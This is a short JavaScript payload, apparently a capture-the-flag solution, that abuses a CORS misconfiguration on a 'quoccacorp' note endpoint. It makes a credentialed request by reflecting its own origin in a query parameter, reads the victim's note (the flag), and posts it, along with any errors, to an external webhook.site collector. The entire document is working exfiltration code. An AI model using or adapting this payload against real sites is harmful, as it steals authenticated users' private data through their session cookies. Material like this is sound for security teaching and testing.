<script>
    // We target the note endpoint and reflect our own origin
    const targetUrl = "https://cors-api.quoccacorp.com/note?cors-allow-origin=" + window.location.origin;
    
    fetch(targetUrl, { 
        credentials: "include" // This is what forces the 'Cookie: note=...' to be sent
    })
    .then(response => response.text())
    .then(flag => {
        // Send the flag (which was inside the cookie) to your webhook
        fetch("https://webhook.site/ac3c1f08-eab5-451a-b5c0-2d9e21ce0eca", {
            method: "POST",
            mode: "no-cors",
            body: flag
        });
    })
    .catch(err => {
        // If it fails, send the error to your webhook so you can debug
        fetch("https://webhook.site/ac3c1f08-eab5-451a-b5c0-2d9e21ce0eca?error=" + btoa(err));
    });
</script>
